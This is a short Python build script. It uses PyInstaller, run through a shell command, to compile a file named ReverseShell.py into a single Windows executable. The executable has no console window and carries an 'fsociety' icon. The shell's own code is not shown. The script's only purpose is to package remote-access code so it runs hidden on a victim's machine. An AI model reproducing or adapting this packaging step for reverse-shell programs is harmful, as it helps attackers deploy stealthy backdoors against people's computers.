import subprocess
subprocess.check_output("pyinstaller.exe --onefile --noconsole --icon=fsociety.ico  .\ReverseShell.py",shell=True)
